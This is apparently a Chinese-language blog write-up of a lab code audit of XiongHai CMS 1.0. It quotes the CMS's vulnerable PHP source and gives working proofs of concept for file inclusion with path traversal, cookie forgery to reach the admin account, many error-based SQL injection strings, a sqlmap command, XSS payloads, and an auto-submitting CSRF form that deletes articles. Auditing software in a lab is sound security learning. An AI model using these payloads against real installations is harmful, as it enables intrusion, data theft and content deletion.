# 环境搭建

熊海cms1.0 （http://js.down.chinaz.com/201503/xhcms_v1.0.rar）

seay代码审计工具

phpstudy （php版本不能太高)

搭在win7上作为靶机使用

```
http://192.168.121.130/xhcms/install/
```

安装xhcms

注意这里安装的时候要自己先去创建一个数据库

# 代码审计

先丢进seay去审计一波

![image-20210922153552047](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210922153552047.png)

有34个可疑文件,挨个去看看

## 文件包含

### /index.php

```
<?php
//单一入口模式
error_reporting(0); //关闭错误显示
$file=addslashes($_GET['r']); //接收文件名
$action=$file==''?'index':$file; //判断为空或者等于index
include('files/'.$action.'.php'); //载入相应文件
?>
```

典型的文件包含漏洞,虽然参数经过了addslashes()处理,但是对于文件包含来说没什么用

包含的文件是files目录下的文件，可以包含我在files目录下新建的phpinfo.php,

![image-20210922154614043](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210922154614043.png)

如果要包含根目录下的文件,通过目录穿越即可

![image-20210922154503380](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210922154503380.png)

### /admin/index.php

这个文件的代码和刚才的index.php的代码一模一样,利用方式也就相同

只是它包含的文件是admin目录下的files目录里面的文件

## 越权访问

### /inc/checklogin.php

```
<?php
$user=$_COOKIE['user'];
if ($user==""){
header("Location: ?r=login");
exit;	
}
?>
```

这是个越权漏洞,在seay中并没有被扫出来

先检验cookie中user的值,如果为空则跳转到登陆界面

利用方法

这里不能直接利用,需要配合登陆页面一起使用,在如下地址去测试

```
http://192.168.121.130/xhcms/admin
```

利用admin账户登陆后会添加一个值为admin的cookie

![image-20210922163100428](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210922163100428.png)

退出登陆可以看到cookie值已经不见

![image-20210922163704248](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210922163704248.png)

登陆一个已经存在的用户

![image-20210922163646376](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210922163646376.png)

将cookie中的user修改为admin,登陆到了admin用户

![image-20210922163810295](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210922163810295.png)

由此可见，所有调用checklogin.php的文件都存在越权漏洞。

涵盖范围：admin/files目录下除login.php和outlogin.php外所有页面

这里应该是凭借cookie中的user来判断用户的,所以随便登陆一个用户,只要user的值为admin那就可以去登陆admin账户实现越权

## SQL注入

### /admin/files/adset.php

```
<?php
require '../inc/checklogin.php';
require '../inc/conn.php';
$setopen='class="open"';
$query = "SELECT * FROM adword";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$ad = mysql_fetch_array($resul);

$save=$_POST['save'];
$ad1=addslashes($_POST['ad1']);
$ad2=addslashes($_POST['ad2']);
$ad3=addslashes($_POST['ad3']);
if ($save==1){
$query = "UPDATE adword SET 
ad1='$ad1',
ad2='$ad2',
ad3='$ad3',
date=now()";
@mysql_query($query) or die('修改错误：'.mysql_error());
echo "<script>alert('亲爱的，广告设置成功更新。');location.href='?r=adset'</script>"; 
exit;
}
?>
```

提交的参数ad1,ad2,ad3都经过了addslashes修饰

```
单纯使用addslashes()函数会造成两个问题：
	1.是否采用GBK（宽字节注入）
	2.sql语句是否采用了单引号闭合。
```

这里不存在sql注入,属于误报,但是他前面包含了两个文件

可以跟进去看看

inc目录下的文件都是配置文件,十分重要

### /admin/files/login.php

seay给出了好多SQL的洞,但是没有给出这个文件

```
<?php 
ob_start();
require '../inc/conn.php';
$login=$_POST['login'];
$user=$_POST['user'];
$password=$_POST['password'];
$checkbox=$_POST['checkbox'];

if ($login<>""){
$query = "SELECT * FROM manage WHERE user='$user'";
$result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$users = mysql_fetch_array($result);

if (!mysql_num_rows($result)) {  
echo "<Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();</Script>";
exit;
}else{
$passwords=$users['password'];
if(md5($password)<>$passwords){
echo "<Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();</Script>";
exit;	
	}
//写入登录信息并记住30天
if ($checkbox==1){
setcookie('user',$user,time()+3600*24*30,'/');
}else{
setcookie('user',$user,0,'/');
}
echo "<script>this.location='?r=index'</script>";
exit;
}
exit;
ob_end_flush();
}
?>
```

这里需要去利用admin的登陆页面

```
http://192.168.121.130/xhcms/admin/?r=login
```

```
关键代码：
$login=$_POST['login'];			//参数直接由POST获取，无任何过滤
$user=$_POST['user'];
$password=$_POST['password'];
$checkbox=$_POST['checkbox'];

$query = "SELECT * FROM manage WHERE user='$user'";
$result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$users = mysql_fetch_array($result);

$passwords=$users['password'];
if(md5($password)<>$passwords)	//将输入的password的md5值进行匹配
{
	echo "<Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();</Script>";
	exit;	
}
```

查询的sql语句是在user这个地方,并且这里参数除了用单引号闭合并没有其他过滤处理了

这里开启了mysql_error()，可以进行报错注入,注入点在user

```
1' or updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```

![image-20210923114917909](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210923114917909.png)

用sqlmap探测也可以这里

```
python sqlmap.py -r 1.txt --dbs --batch
```

报错方式和注入点sqlmap也给了出来

![image-20210923120255569](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210923120255569.png)

不过这里跑了好久

![image-20210923120136583](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210923120136583.png)

### /admin/files/editcolumn.php

```
<?php
require '../inc/checklogin.php';
require '../inc/conn.php';
$columnopen='class="open"';
$id=$_GET['id'];
$type=$_GET['type'];

if ($type==1){
$query = "SELECT * FROM nav WHERE id='$id'";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$nav = mysql_fetch_array($resul);
}
if ($type==2){
$query = "SELECT * FROM navclass WHERE id='$id'";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$nav = mysql_fetch_array($resul);
}

$save=$_POST['save'];
$name=$_POST['name'];
$keywords=$_POST['keywords'];
$description=$_POST['description'];
$px=$_POST['px'];
$xs=$_POST['xs'];
if ($xs==""){
$xs=1;	
}
$tuijian=$_POST['tuijian'];
if ($tuijian==""){
$$tuijian=0;	
}

$content=$_POST['content'];

if ($save==1){
	
if ($name==""){
echo "<script>alert('抱歉，栏目名称不能为空。');history.back()</script>";
exit;
}

if ($type==1){
$query = "UPDATE nav SET 
name='$name',
keywords='$keywords',
description='$description',
xs='$xs',
px='$px',
content='$content',
date=now()
WHERE id='$id'";
@mysql_query($query) or die('修改错误：'.mysql_error());
echo "<script>alert('亲爱的，一级栏目已经成功编辑。');location.href='?r=columnlist'</script>"; 
exit;
}

if ($type==2){
$query = "UPDATE navclass SET 
name='$name',
keywords='$keywords',
description='$description',
xs='$xs',
px='$px',
tuijian='$tuijian',
date=now()
WHERE id='$id'";
@mysql_query($query) or die('修改错误：'.mysql_error());

echo "<script>alert('亲爱的，二级栏目已经成功编辑。');location.href='?r=columnlist'</script>"; 
exit;
}

}
?>
```

这是一个后台的链接界面,我们先登陆进后台,然后去包含这个文件

```
http://192.168.121.130/xhcms/admin/?r=editcolumn
```

其实这个文件夹下的所有文件都需要这么去使用

跳转到了如下界面

![image-20210923121310956](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210923121310956.png)

关键代码

```
$id=$_GET['id'];
$type=$_GET['type'];
if ($type==1){
$query = "SELECT * FROM nav WHERE id='$id'";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$nav = mysql_fetch_array($resul);
}
if ($type==2){
$query = "SELECT * FROM navclass WHERE id='$id'";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$nav = mysql_fetch_array($resul);
}
$save=$_POST['save'];
$name=$_POST['name'];
$keywords=$_POST['keywords'];
$description=$_POST['description'];
$px=$_POST['px'];
$xs=$_POST['xs'];		//变量由POST直接得到，未做过滤
```

sql语句都差不多,就是单引号闭合而已,主要看参数

这里需要传参type和id参数,type为一或者为2都可以

```
http://192.168.121.130/xhcms/admin/?r=editcolumn&type=2&id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

![image-20210923231507005](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210923231507005.png)

当然控制type参数还可以进入下面的update语句,一样可以去执行语句

### /admin/files/editlink.php

```
<?php
require '../inc/checklogin.php';
require '../inc/conn.php';
$linklistopen='class="open"';
$id=$_GET['id'];
$query = "SELECT * FROM link WHERE id='$id'";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$link = mysql_fetch_array($resul);

$save=$_POST['save'];
$name=$_POST['name'];
$url=$_POST['url'];
$mail=$_POST['mail'];
$jieshao=$_POST['jieshao'];
$xs=$_POST['xs'];
if ($xs==""){
$xs=1;	
	}

if ($save==1){
	
if ($name==""){
echo "<script>alert('抱歉，链接名称不能为空。');history.back()</script>";
exit;
}
if ($url==""){
echo "<script>alert('抱歉，链接地址不能为空。');history.back()</script>";
exit;
}

$query = "UPDATE link SET 
name='$name',
url='$url',
mail='$mail',
jieshao='$jieshao',
xs='$xs',
date=now()
WHERE id='$id'";
@mysql_query($query) or die('修改错误：'.mysql_error());
echo "<script>alert('亲爱的，链接已经成功编辑。');location.href='?r=linklist'</script>"; 
exit;
}
?>
```

这里还是只有单引号闭合,利用方式和之前的差不多,只需要GET一个id参数即可,甚至不用去控type参数就可以直接注入

![image-20210923232257934](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210923232257934.png)

```
http://192.168.121.130/xhcms/admin/?r=editlink&type=2&id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

也可以在post参数那里直接注入

```
1' or updatexml(1,concat(0x7e,(select database())),0) or'
```

![image-20210925145226763](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210925145226763.png)

这里在后面需要加上`or'`才能注入,因为他这里有很多变量需要联系起来,而且不用注释符

当然上面那个文件也可以这么注入

### /admin/files/editsoft.php

一样的get一个id参数可以注入

```
1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

在下面的输入框也能注入

```
1' or updatexml(1,concat(0x7e,(select database())),0) or'
```

### /admin/files/editwz.php

和上面无异

### /admin/files/imageset.php

和上面无异,只是这里不会GET一个id参数,只有content那里加了一个addslashes处理其他的并没有

这里可以上传文件,但是好像没法利用

### /admin/file/manageinfo.php

不提交id参数,post方式在输入框仍然可以注入

不过这里还有一个xss,还是个存储型xss,每次访问的时候都会弹窗了

![image-20210925150753791](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210925150753791.png)

因为这里的参数并没有用htmlspecialchars()或htmlentities()函数过滤

```
<script>alert(1)</script>

<img src=1 onerror=alert(/xss/)>
```

由此可以看出前面没有对参数处理的那些输入框也会存在xss,试了试都可以

这些文件都除了adset都存在sql注入利用条件出奇的一致

![image-20210925152346946](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210925152346946.png)

### /files/content.php

这个文件需要从/index.php进去,同样是利用文件包含

```
http://192.168.121.130/xhcms/?r=content
```

源码

```
<?php 
require 'inc/conn.php';
require 'inc/time.class.php';
$query = "SELECT * FROM settings";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$info = mysql_fetch_array($resul);

$id=addslashes($_GET['cid']);
$query = "SELECT * FROM content WHERE id='$id'";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$content = mysql_fetch_array($resul);

$navid=$content['navclass'];
$query = "SELECT * FROM navclass WHERE id='$navid'";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$navs = mysql_fetch_array($resul);

//浏览计数
$query = "UPDATE content SET hit = hit+1 WHERE id=$id";
@mysql_query($query) or die('修改错误：'.mysql_error());
?>
<?php
$query=mysql_query("select * FROM interaction WHERE (cid='$id' AND type=1 and xs=1)");
$pinglunzs = mysql_num_rows($query)
?>
```

这里的id虽然经过了`$id=addslashes($_GET['cid']);`处理,但是sql语句没有单引号保护,可以直接注入

```
$query = "UPDATE content SET hit = hit+1 WHERE id=$id";
```

```
http://192.168.121.130/xhcms/?r=content&cid=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
```

![image-20210925152903194](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210925152903194.png)

### /files/software.php

```
<?php 
require 'inc/conn.php';
require 'inc/time.class.php';
$query = "SELECT * FROM settings";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$info = mysql_fetch_array($resul);
$id=addslashes($_GET['cid']);
$query = "SELECT * FROM download WHERE id=$id";
$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
$download = mysql_fetch_array($resul);

//浏览计数
$query = "UPDATE download SET hit = hit+1 WHERE id=$id";
@mysql_query($query) or die('修改错误：'.mysql_error());
?>
```

sql语句依然是没有单引号保护,利用方式如上

### /files/submit.php

源码

```
<?php
session_start();
require 'inc/conn.php';
$type=addslashes($_GET['type']);
$name=$_POST['name'];
$mail=$_POST['mail'];
$url=$_POST['url'];
$content=$_POST['content'];
$cid=$_POST['cid'];
$ip=$_SERVER["REMOTE_ADDR"];
$tz=$_POST['tz'];
if ($tz==""){$tz=0;}
$jz=$_POST['jz'];

$query = "SELECT * FROM interaction WHERE( mail = '$mail')";
```

这里只对type参数进行了过滤,因而涉及到其他参数的SQL语句可能会存在SQL注入漏洞

漏洞存在位置

**漏洞位置：**`files/submit.php`第66行

```
$query = "SELECT * FROM interaction WHERE( mail = '$mail')";
```

**漏洞位置：**`files/submit.php` 第121-147行

```
$query = "INSERT INTO interaction (
type,
xs,
cid,
name,
mail,
url,
touxiang,
shebei,
ip,
content,
tz,
date
) VALUES (
'$type',
'$xs',
'$cid',
'$name',
'$mail',
'$url',
'$touxiang',
'$shebei',
'$ip',
'$content',
'$tz',
now()
)";
```

**漏洞位置：**`files/submit.php` 第176行

```
$query = "SELECT * FROM content WHERE( id= $cid)";
```

**漏洞位置：**`files/submit.php` 第206行

```
$query = "SELECT * FROM download WHERE( id= $cid)";
```

这里就随便拿一个来测试了,payload如下

```
name=1&content=有注入哦&mail=1') and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```

![image-20210925161137880](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210925161137880.png)





### /install/index.php

```
关键代码
$user=$_POST['user'];
$password=md5($_POST['password']);
$query = "UPDATE manage SET user='$user',password='$password',name='$user'";
```

我们在安好数据库后重新进入这个界面的时候需要删除该文件下的installLock.txt

![image-20210926154450729](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926154450729.png)

```
1' or extractvalue(1,concat(0x7e,(select version()),0x7e))#
```

![image-20210926154718367](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926154718367.png)

看到出现对应版本

![image-20210926154654680](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926154654680.png)



### /admin/files/wzlist.php

```
$delete=$_GET['delete'];
if ($delete<>""){
$query = "DELETE FROM content WHERE id='$delete'";
$result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
echo "<script>alert('亲，ID为".$delete."的内容已经成功删除！');location.href='?r=wzlist'</script>";
exit; 
}
```

这里对delete参数没有经过严格的过滤,可以进行SQL注入

```
http://192.168.121.130/xhcms/admin/?r=wzlist&delete=1' or extractvalue(1,concat(0x7e,(select version()),0x7e))--+
```

![image-20210926155638018](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926155638018.png)

### /admin/files/softlist.php

和上个文件一样,出现漏洞点的代码都是一样的,打开文件就能看到

```
$delete=$_GET['delete'];
if ($delete<>""){
$query = "DELETE FROM download WHERE id='$delete'";
$result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
echo "<script>alert('亲，ID为".$delete."的内容已经成功删除！');location.href='?r=softlist'</script>";
exit; 
}
?>
```

## XSS

以上的SQL注入的文件,大多数输入框那里并没有对输入框中的文本进行处理会存在xss漏洞,并且那种保存下来的还是存储型的xss漏洞,这里就不再赘述

### /files/contact.php

漏洞位置：`files/contact.php` 第12~15行

```
$page=addslashes($_GET['page']);
if ($page<>""){
if ($page<>1){
$pages="第".$page."页 - ";
```

这里的$page经过addslashes处理一次带入了页面

传参试试

![image-20210925181338715](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210925181338715.png)

page就是留言板的页数

![image-20210925181022276](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210925181022276.png)

这是一个反射型的xss

### /files/content.php

这个文件除了SQL注入,还存在一个存储型的xss

这个页面访问需要加上cid参数

```
http://192.168.121.130/xhcms/?r=content&cid=1
```

![image-20210926150716824](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926150716824.png)

126-141行

```
<div class="lou">回复 #<?php echo $pinglun['id']?> 楼</div>
<?php 
$query2 = "SELECT * FROM manage";
$resul2 = mysql_query($query2) or die('SQL语句有误：'.mysql_error());
$manage2 = mysql_fetch_array($resul2);
if ($manage2['img']==""){
$touxiang="images/manage.jpg";
} else{
$touxiang=$manage2['img'];		
}
?>
<img src="<?php echo $touxiang?>">
<strong><?php echo $manage2['name']?><span>认证站长</span></strong>
<li>位置：<a><?php echo $pinglun['rip']?></a></li>
<li>时间：<a><?php echo tranTime(strtotime($pinglun['rdate']))?></a></li>
<li>来自：<a><?php echo $pinglun['rshebei']?></a></li>
```

这里是从$pinglun这个变量中取出其中的信息，随后插入存储信息的`interaction`表

在第154行

```
<form  name="form" method="post" action="/?r=submit&type=comment&cid=<?php echo $id?>">
```

这里在content页面提交后会跳转到

```
http://192.168.121.130/?r=submit&type=comment&cid=1
```

在submit.php中第48行

```
$content= addslashes(strip_tags($content));//过滤HTML
```

虽然在评论处可以提交昵称、邮箱、网址、评论内容，但是显示评论和留言的地方只有昵称，所以只有昵称处有存储型XSS。

这里我并没有测试成功因为我的跳转页面好像出了一点问题,他跳转到了

```
http://192.168.121.130/?r=submit&type=comment&cid=1
```

而我的目录下不存在这个文件啊,应该跳转到的是

```
http://192.168.121.130/xhcms?r=submit&type=comment&cid=1
```

不过在我更换网站根目录为xhcms后测试成功

![image-20210926152846625](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926152846625.png)

![image-20210926152901841](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926152901841.png)

每次访问这个页面都会弹窗

其实我在contact页面尝试也发现了这个存储型xss

![image-20210926153154555](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926153154555.png)

![image-20210926153202937](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926153202937.png)

## CSRF

### /admin/files/wzlist.php

```
关键代码:
$delete=$_GET['delete'];
if ($delete<>""){
$query = "DELETE FROM content WHERE id='$delete'";
$result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
echo "<script>alert('亲，ID为".$delete."的内容已经成功删除！');location.href='?r=wzlist'</script>";
exit; 
}
```

之前说的这里是一个SQL注入,因为他这里的参数没有进行过滤,也没有执行token验证

不过这也可以造成csrf

先抓个包,用burp的一键生成poc

![image-20210926160557935](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926160557935.png)

访问一下

![image-20210926160456350](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926160456350.png)

点击后,跳转到了

![image-20210926160529972](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926160529972.png)

这个需要我们登陆的是admin账户

这种方式虽然成功了，但是必须跟用户产生交互才能执行成功，因此我们需要更改一下代码，使它更难被发现。

增加两行js脚本代码，从而实现自动化虚拟请求

```
<script type="text/javascript">
var form = document.getElementsByTagName('form')[0];
form.submit();
</script>
```

![image-20210926161715839](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926161715839.png)

点进去自动跳转

![image-20210926161729435](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926161729435.png)

可以看到已经删除了

![image-20210926161827954](/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20210926161827954.png)

其实这里不用这么麻烦,可以直接修改URL就可以删除任意一篇文章

### /admin/files/softlist.php

和上个文件一样,出现漏洞点的代码都是一样的,打开文件就能看到

```
$delete=$_GET['delete'];
if ($delete<>""){
$query = "DELETE FROM download WHERE id='$delete'";
$result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
echo "<script>alert('亲，ID为".$delete."的内容已经成功删除！');location.href='?r=softlist'</script>";
exit; 
}
?>
```

# 后记

整个cms的代码总体来说比较简单,比较时候入门的时候来做,这也是一次做代码审计,后面可以做做bluecms的审计,难度也比较时候代码审计的入门

通过这次审计对cms的审计方式有了一定的了解,测试的时候利用漏洞的方式和靶场的还是不太一样,需要结合多个文件去利用,有些页面需要利用文件包含才能访问

这个cms的话,漏洞挺多的,这种简单的SQL和文件包含现在在大多数cms中肯定也不会出现了吧,肯定也有还没有涉及到的,seay和RIPS不能完全给出正确答案,在审计的时候还是要自己去审计一下代码



参考链接:

https://xz.aliyun.com/t/7629

https://blog.csdn.net/weixin_43872099/article/details/103001600

